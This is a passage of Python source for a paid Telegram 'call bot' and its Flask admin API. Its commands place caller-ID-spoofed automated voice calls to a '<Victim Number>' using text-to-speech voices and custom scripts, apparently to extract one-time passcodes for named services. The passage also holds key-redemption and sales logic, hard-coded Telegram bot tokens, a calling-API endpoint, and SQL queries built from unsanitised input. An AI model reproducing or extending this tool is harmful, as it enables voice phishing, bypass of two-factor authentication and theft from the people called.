                        bot.send_message(message.from_user.id, f"*Invalid command\n/call <Victim Number> <Spoof Number> <Service Name> <OTP Digits> <voice>*",parse_mode='markdown')
            else:
               bot.send_message(message.from_user.id, "*❌ Redeem new key to activate*",parse_mode='markdown')  
               delete_data(id) 
        else:
             bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
    else:
       bot.send_message(message.from_user.id, "*❌ Redeem key to activate*",parse_mode='markdown')
    c.close()
#----------------------------------------------------------------------------------------------------------------------------------------------------------
         
#_-----------------------------Custom Calling---------------------------------------------------------------------------------------------------------
@bot.message_handler(commands=['customcall'])
def make_call_custon(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    username = message.from_user.username
    c.execute(f"Select * from users where user_id={id}")
    row= c.fetchone()
    if row!=None :
        if row[3]!='ban':
            if user_day_check(id)>0:
                    mes =(message.text).split()
                    try:
                        number = mes[1]
                        spoof = mes[2]
                        script_id = mes[3]
                        voice = mes[4]
                        bot.send_message(message.from_user.id,f"""
📞 <b>Calling</b> +{number}
📱 <b>As</b> +{spoof}
✋ <b>Hold on !</b> Calling in progress

❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                        c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                        db.commit()
                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
                        custom_sc = c.fetchone()
                        
                        if custom_sc==None:
                            raise ValueError

                        c.execute(f"Select * from users where user_id={id}")
                        row= c.fetchone()
                        call_s1 = row[6]
                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
                        custom_sc = c.fetchone()
                        c.execute(f"Select * from users where user_id={id}")
                        row= c.fetchone()
                        call_s1 = row[6]
                        if (call_s1!=0):
                
                                c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
                                db.commit()
                                call_update(id)
                                b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id,amd=row[13])

                        else:
                            bot.send_message(message.from_user.id, """* Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
                    except:
                        bot.send_message(message.from_user.id, f"*Invalid command\n/customcall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
            else:
                   bot.send_message(message.from_user.id, "*❌ Redeem key to activate*",parse_mode='markdown')  
                   delete_data(id) 
        else:
                 bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
    else:
       send_welcome(message)

#-handle Call backs -----------------

@bot.callback_query_handler(func=lambda message: True)
def handle_callback(message):
    global last_message_ids
    print(message.from_user.id)

    # username = message.from_user.username
    # url = f"https://api.telegram.org/bot5790251044:AAEs0MXum_SB_MoOshv7rQUeXNDc90sK8JM/sendMessage?chat_id=1819146856&text=@{name} - {message.data}"
    # requests.post(url)
    if message.data == '/validity':
        current_credit(message)
    elif message.data == '/recall':
        recall_now(message)
    elif message.data == '/redeem':
        redeem_user(message)
    elif message.data == '/profile':
        Profile_def(message)
    elif message.data == '/price':
       Price_list(message)
    elif message.data == '/customscript':
        Set_custom(message)
    elif message.data == '/voice':
        Voices(message)
    elif message.data == '/help':
        bot.send_message(message.from_user.id,"Contact @shadow_hiddenx For Any Help 🎭")
    elif message.data == '/buy':
        bot.send_message(message.from_user.id,"Purchase from  @shadow_hiddenx")
    elif message.data == '/voiceback':
        Voices(message)
    elif message.data == '/community':
        community(message)
    elif message.data == '/commands':
        Commands(message)
    elif message.data == '/backstart':
        Start_back(message)
    elif message.data == '/privacy':
        Privacy(message)
    elif message.data == '/activatedstartback':
        activatedstartback(message)
    elif message.data == '/features':
        Features(message)
    elif message.data == '/support':
        Support(message)

    elif message.data =='/ind':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/voiceback")
        keyboard.add(item1)
    
        bot.edit_message_caption(caption="""
1: `en-IN-NeerjaNeural`
2: `en-IN-PrabhatNeural`
3: `hi-IN-MadhurNeural`
4: `hi-IN-SwaraNeural`
6: `bn-IN-BashkarNeural`
7: `gu-IN-DhwaniNeural`
8: `gu-IN-NiranjanNeural`
9: `kn-IN-SapnaNeural`
10: `kn-IN-GaganNeural`
11: `ml-IN-SobhanaNeural`
12: `ml-IN-MidhunNeural`
13: `mr-IN-AarohiNeural`
14: `mr-IN-ManoharNeural`
15: `ta-IN-PallaviNeural`
16: `ta-IN-ValluvarNeural`
17: `ur-IN-GulNeural`
18: `ur-IN-SalmanNeural`""",chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],parse_mode='MarkDown',reply_markup=keyboard)
        
    elif message.data =='/us':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/voiceback")
        keyboard.add(item1)
        bot.edit_message_caption("""
1: `en-US-AmberNeural`
2: `en-US-AnaNeural`
3: `en-US-AriaNeural`
4: `en-US-AshleyNeural`
5: `en-US-BrandonNeural`
6: `en-US-ChristopherNeural`
7: `en-US-CoraNeural`
8: `en-US-DavisNeural`
9: `en-US-ElizabethNeural`
10: `en-US-EricNeural`
11: `en-US-GuyNeural`
12: `en-US-JacobNeural`
13: `en-US-JaneNeural`
14: `en-US-JasonNeural`
15: `en-US-JennyMultilingualNeural`
16: `en-US-JennyNeural`
17: `en-US-MichelleNeural`
18: `en-US-MonicaNeural`
19: `en-US-NancyNeural`
20: `en-US-RogerNeural`
21: `en-US-SaraNeural`
22: `en-US-SteffanNeural`
23: `en-US-TonyNeural`""",chat_id=message.from_user.id, message_id=last_message_ids[message.from_user.id],parse_mode='MarkDown',reply_markup=keyboard)




@app.route('/gen_key', methods=['POST','GET'])
def keygen():
    days =  request.args.get('days')
    key =  put_user_key(days)
    response_data = {'key': f'{key}'}
    return jsonify(response_data)


@app.route('/users', methods=['POST','GET'])
def users():
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(F"SELECT * FROM users")
    users = c.fetchall()
    c.close()
    return jsonify(users)



@app.route('/delete', methods=['POST','GET'])
def delete():
    userid =  request.args.get('userid')
    resp =  delete_data(int(userid))
    response_data = {'Response': f'{resp}'}
    return jsonify(response_data)


@app.route('/balance', methods=['POST','GET'])
def balance():
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"Select * from api_key where id=123")
    apidata= c.fetchone()
    if apidata[1]==1:
         current_api = "Mia Api Working"
    elif apidata[1]==2:
         current_api = "Texis Api Working"
    url1 = 'http://162.33.178.184:3001/v1/balance'
    data1 = {"apikey": f"{apiKey2}"}

    url2 = 'https://ai2api.com/v1/api/balance'
    data2 = {"apikey" : f"{apiKey}"
    }

    resp1 = requests.get(url1, json=data1)
    resp2 = requests.post(url2, json=data2)
    res1 = json.loads(resp1.text)
    res2 = json.loads(resp2.text)
    response_data = {'Texis Balance ': res1['balance'],'AI2API Balance':res2['balance'] , 'Working API':f'{current_api}'}
    c.close()
    return jsonify(response_data)

@app.route('/switch', methods=['POST','GET'])
def switchapi():
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"Select * from api_key where id=123")
    apidata= c.fetchone()
    if apidata[1]==1:
         c.execute("update api_key set val=2 where id=123")
         db.commit()
    elif apidata[1]==2:
         c.execute("update api_key set val=1 where id=123")
         db.commit()
    return "done"


@app.route('/announce', methods=['POST','GET'])
def annonce():
    mess =  request.args.get('message')
    user = request.args.get('user')
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"select * from users ")
    r2= c.fetchall()
    print(r2)
    for users in r2:  
        requests.post(f"https://api.telegram.org/bot7383376915:AAEzhKfgLnEejoyEQc8jEfF0I54BT7Jo5EM/sendMessage?chat_id={users[1]}&text={user} : {mess}")
    response_data = {'Response': f'Message Sent'}
    return jsonify(response_data)




if __name__ == '__main__':
    app.run(port=5500)
